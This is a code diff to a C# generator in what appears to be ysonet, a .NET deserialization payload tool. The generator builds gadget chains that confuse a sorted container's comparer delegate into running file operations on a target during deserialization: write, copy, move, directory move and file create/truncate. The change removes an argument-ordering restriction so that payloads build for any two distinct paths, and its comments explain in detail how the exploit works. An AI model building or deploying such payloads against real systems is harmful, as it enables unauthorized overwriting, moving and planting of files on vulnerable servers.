@@ -30,17 +30,22 @@ namespace ysonet.Generators
      *   4           Directory.Move(source, destination)    -c "sourcePath;destinationPath"
      *   5           File.WriteAllText(targetPath, "")      -c "targetPath"
      *
-     * ORDERING is the one hard constraint. On deserialize the sorted container inserts the
-     * SMALLER-sorting element first as the tree root and compares the larger against it, so
-     * the larger element always lands in the spliced method's FIRST argument. That is why
-     * this gadget builds its container with String.CompareOrdinal instead of the
-     * culture-sensitive String.Compare the command path uses: the order is fixed at build
-     * time by whatever comparison fills the container, so the generation-time guard and the
-     * serialized order must be the same comparison, or a payload built under one culture
-     * could hand the sink its arguments the other way round. Variants 1 to 4 therefore
-     * refuse any input where CompareOrdinal(firstArgument, secondArgument) is not greater
-     * than zero, instead of silently swapping or rewriting what the user typed. Variant 5
-     * pairs the target path with an internal "", which every non-empty string sorts after.
+     * ORDERING is fixed at build time, not asked of the operator. On deserialize the sorted
+     * container inserts the first serialized element as the tree root and compares the SECOND
+     * against it, so that second element lands in the spliced method's FIRST argument. Which
+     * string that is is decided here: BuildConfusedContainer fills the container through a
+     * generation-only ordering in invocation-list slot 1 - the same slot the file-operation
+     * delegate replaces - so the semantic first argument is always serialized second, in
+     * either ordinal direction. See FillOrderPuttingTheFirstArgumentLast. Two strings that
+     * are EQUAL are still refused (RequireDistinctFields): every root here is keyed on the
+     * string, so an equal pair collapses to one element and the payload does nothing.
+     * Variant 5 pairs the target path with an internal "", which is always distinct from a
+     * non-empty path.
+     *
+     * The wire still carries String.CompareOrdinal in slot 0, which is what these payloads
+     * have always carried, and the serialized order no longer depends on any comparison at
+     * all - so the bytes are the same under any operator culture, and the same as before this
+     * ordering was fixed for every input that used to be accepted.
      *
      * Variant 5 uses an empty File.WriteAllText rather than File.Create on purpose:
      * File.Create hands back an open FileStream with FileShare.None and the confused call
@@ -178,8 +183,8 @@ namespace ysonet.Generators
                 + "delegate confusion, without starting a process: write text from a local "
                 + "file, copy, move, move a directory, or create/truncate an empty file. The "
                 + "var/variant option picks the operation and decides what -c means; the two "
-                + "strings must be in strict ordinal order, which the generator enforces. "
-                + "This CLR4.5+ graph does not support --legacyfx.";
+                + "strings only have to DIFFER, in either order. This CLR4.5+ graph does not "
+                + "support --legacyfx.";
         }
 
         public override List<string> Labels()
@@ -240,8 +245,9 @@ namespace ysonet.Generators
                         + "5 -> create or truncate an empty file (-c \"targetPath\"). Every path "
                         + "except the local content file is a path on the TARGET and is never "
                         + "touched here. Only the first ';' splits the value, so the second field "
-                        + "may contain more of them. The first argument must sort strictly after "
-                        + "the second with String.CompareOrdinal, or generation is refused. "
+                        + "may contain more of them. The two strings only have to DIFFER, in "
+                        + "either order; an equal pair is refused because the sorted container "
+                        + "would collapse it to one element and the payload would do nothing. "
                         + "Preconditions on the target: write and empty create or overwrite the "
                         + "file but do not create its parent directory; copy and both moves do "
                         + "not overwrite an existing destination; dirmove needs an existing "
@@ -319,7 +325,7 @@ namespace ysonet.Generators
 
             string first, second;
             ReadFields(op, inputArgs, out first, out second);
-            RequireOrdinalOrder(op, first, second);
+            RequireDistinctFields(op, first, second);
 
             if (formatter.Equals(Formatters.SoapFormatter,
                 StringComparison.OrdinalIgnoreCase))
@@ -332,9 +338,8 @@ namespace ysonet.Generators
                     first, second, inputArgs);
             }
 
-            // keysMayCollide is false: RequireOrdinalOrder has already refused an equal
-            // pair with a message that names the operation, so the generic duplicate-key
-            // refusal inside the container can never be reached from here.
+            // The container needs no duplicate-key check of its own: RequireDistinctFields
+            // has already refused an equal pair with a message that names the operation.
             object payload = BuildConfusedContainer(root_container_number,
                 Slot1For(op.Number), first, second);
 
@@ -352,9 +357,12 @@ namespace ysonet.Generators
         private static object BuildConfusedContainer(int container, Delegate slot1,
             string first, string second)
         {
+            // Slot 0 is the benign String.CompareOrdinal the finished payload carries. Slot 1
+            // only orders the container while it is filled HERE, and the splice below
+            // overwrites it with the file-operation delegate before anything is serialized.
             Comparison<string> combined = (Comparison<string>)MulticastDelegate.Combine(
                 new Comparison<string>(String.CompareOrdinal),
-                new Comparison<string>(String.CompareOrdinal));
+                FillOrderPuttingTheFirstArgumentLast(first));
             IComparer<string> comparer = Comparer<string>.Create(combined);
 
             object root;
@@ -403,6 +411,34 @@ namespace ysonet.Generators
             return root;
         }
 
+        // The container serializes its two elements smallest first, and on deserialize the
+        // target compares the SECOND one against the first - which is what makes that second
+        // element the operation's FIRST argument. Which string that is must not depend on how
+        // the operator's two paths happen to sort: a copy from "a-source.txt" to
+        // "z-destination.txt" is an ordinary request, and reading the order off the strings
+        // used to mean refusing it.
+        //
+        // So the order is fixed here. A multicast Comparison returns the result of the LAST
+        // method in its invocation list, which is slot 1 - the same slot the file-operation
+        // delegate replaces immediately afterwards - so an ordering placed there decides the
+        // serialized order and never reaches the wire. The payload still carries
+        // [String.CompareOrdinal, <operation>], and the authored SOAP document already wrote
+        // its two items in this same fixed order, so both forms of this gadget agree without
+        // either of them consulting the strings.
+        //
+        // Ordinal equality, matching the guard: an EQUAL pair is still refused up front
+        // (RequireDistinctFields), because the container would collapse to one element.
+        private static Comparison<string> FillOrderPuttingTheFirstArgumentLast(
+            string firstArgument)
+        {
+            return delegate(string x, string y)
+            {
+                if (String.CompareOrdinal(x, y) == 0)
+                    return 0;
+                return String.Equals(x, firstArgument, StringComparison.Ordinal) ? 1 : -1;
+            };
+        }
+
         // ---- Direct SoapFormatter document ------------------------------------
 
         private object SerializeSoapFileContainer(int container, FileOperation op,
@@ -419,7 +455,11 @@ namespace ysonet.Generators
             string first, string second, bool minify)
         {
             var comparer = new SoapComparisonComparerProxy(Slot1For(op.Number));
-            string[] items = new string[] { second, first }; // strict ordinal order proved above
+            // The first argument is written SECOND, so the target compares it against the
+            // root and hands it to the operation first. The object graph fixes the same order
+            // (FillOrderPuttingTheFirstArgumentLast), so both forms agree for any distinct
+            // pair, whichever way round the two strings sort.
+            string[] items = new string[] { second, first };
             var root = new SoapSetProxy(comparer, items);
 
             string payload;
@@ -768,31 +808,32 @@ namespace ysonet.Generators
 
         // ---- The ordering rule -------------------------------------------------
 
-        // The sorted container serializes its two elements smallest first, and on
-        // deserialize the LARGER one is the element handed to the spliced method as
-        // argument 1. So the semantic first argument has to sort strictly after the second.
+        // The sorted container serializes its two elements smallest first, and on deserialize
+        // the SECOND one is the element handed to the spliced method as argument 1. Which
+        // element that is no longer depends on the two strings: BuildConfusedContainer fixes
+        // it (see FillOrderPuttingTheFirstArgumentLast), and the authored SOAP document has
+        // always written the same fixed order. Any pair of DISTINCT strings therefore builds
+        // the operation the operator asked for, in either ordinal direction.
         //
-        // The comparison is String.CompareOrdinal over the COMPLETE strings: it is the
-        // first unequal UTF-16 code unit that decides, which is not always the first
-        // character. Nothing here rewrites the user's input to make it pass - no reordering,
-        // no prefix, no BOM (File.ReadAllText consumes a BOM, so it is not part of the
-        // embedded string anyway) and no "\\?\" trick ('\' still sorts below most letters).
-        private static void RequireOrdinalOrder(FileOperation op, string first, string second)
+        // What cannot be built is an EQUAL pair. Every root here is a set keyed on the string:
+        // two equal values collapse into one element, the rebuilt container never compares
+        // anything, and the payload silently does nothing. That is a property of the
+        // primitive, not a policy about input, so it is refused with the operation named
+        // rather than shipped as a dud.
+        //
+        // Equality is ordinal, over the COMPLETE strings, and nothing here rewrites what the
+        // user typed to make it pass.
+        private static void RequireDistinctFields(FileOperation op, string first, string second)
         {
-            if (String.CompareOrdinal(first, second) > 0)
+            if (String.CompareOrdinal(first, second) != 0)
                 return;
 
-            string fix = op.SecondFieldIsLocalFile
-                ? "Change the target path or, if acceptable, change the content so its leading text sorts lower."
-                : "Change one of the two paths, e.g. give the " + op.FirstField
-                    + " a name that sorts higher.";
-
             throw new ArgumentException(op.Name + " requires the " + op.FirstField
-                + " to sort after the " + op.SecondField
-                + " using String.CompareOrdinal, because the sorted container hands the "
-                + "larger string to the operation first. " + fix
-                + " Got " + op.FirstField + " \"" + Preview(first) + "\" and " + op.SecondField
-                + " \"" + Preview(second) + "\".");
+                + " and the " + op.SecondField + " to be different strings, because the "
+                + "sorted container keeps one element per value: an equal pair collapses to a "
+                + "single item, the comparer is never called on deserialize, and the payload "
+                + "does nothing. Got " + op.FirstField + " \"" + Preview(first) + "\" and "
+                + op.SecondField + " \"" + Preview(second) + "\".");
         }
 
         // Keep an error line readable when the second field is a whole file of text.
